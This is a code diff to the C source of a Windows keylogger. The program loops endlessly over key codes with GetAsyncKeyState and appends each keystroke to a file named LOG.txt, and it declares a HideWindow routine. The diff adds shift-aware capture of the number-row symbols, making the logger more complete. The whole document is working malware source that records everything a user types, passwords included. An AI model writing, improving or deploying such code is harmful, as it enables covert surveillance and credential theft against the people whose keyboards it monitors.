@@ -2,7 +2,7 @@
 #include <stdlib.h>
 #include <windows.h>
 
-// FUNCTION DEFINITIONS //
+// FUNCTION DECLARATIONS //
 void HideWindow();
 void KeystrokeHandler(short key, FILE* logfile);
 
@@ -11,26 +11,23 @@ int main(){
     
     while(1){
         
-        // loop thru all keyboard characters not including ASCII extended characters
+        // loop thru keyboard characters
         for(short key = 8; key <= 222; key++){
             
             // check for key press
             // where -32767 means key is pressed
-            // and 0 means key is not pressed
             if(GetAsyncKeyState(key) == -32767){
                 FILE* logfile;
                 logfile = fopen("LOG.txt", "a");
-                //fputc(key, logfile);
                 KeystrokeHandler(key, logfile);
                 fclose(logfile);
             }
         }
     }
-    //fclose(logfile);
     return 0;
 }
 
-// HELPER FUNCTIONS //
+// FUNCTION DEFINITIONS //
 void KeystrokeHandler(short key, FILE* logfile){
     if( (key > 64 && key < 91) && GetAsyncKeyState(0x10)){
         fputc(key, logfile);
@@ -70,6 +67,46 @@ void KeystrokeHandler(short key, FILE* logfile){
             case VK_NUMPAD7: fputc('7', logfile); break;
             case VK_NUMPAD8: fputc('8', logfile); break;
             case VK_NUMPAD9: fputc('9', logfile); break;
+            case 48:
+                if(GetAsyncKeyState(0x10)){ fputc(')', logfile); }
+                else{ fputc('0', logfile); }
+                break;
+            case 49:
+                if(GetAsyncKeyState(0x10)){ fputc('!', logfile); }
+                else{ fputc('1', logfile); }
+                break;
+            case 50:
+                if(GetAsyncKeyState(0x10)){ fputc('@', logfile); }
+                else{ fputc('2', logfile); }
+                break;
+            case 51:
+                if(GetAsyncKeyState(0x10)){ fputc('#', logfile); }
+                else{ fputc('3', logfile); }
+                break;
+            case 52:
+                if(GetAsyncKeyState(0x10)){ fputc('$', logfile); }
+                else{ fputc('4', logfile); }
+                break;
+            case 53:
+                if(GetAsyncKeyState(0x10)){ fputc('%', logfile); }
+                else{ fputc('5', logfile); }
+                break;
+            case 54:
+                if(GetAsyncKeyState(0x10)){ fputc('^', logfile); }
+                else{ fputc('6', logfile); }
+                break;
+            case 55:
+                if(GetAsyncKeyState(0x10)){ fputc('&', logfile); }
+                else{ fputc('7', logfile); }
+                break;
+            case 56:
+                if(GetAsyncKeyState(0x10)){ fputc('*', logfile); }
+                else{ fputc('8', logfile); }
+                break;
+            case 57:
+                if(GetAsyncKeyState(0x10)){ fputc('(', logfile); }
+                else{ fputc('9', logfile); }
+                break;
         }
     }
 }
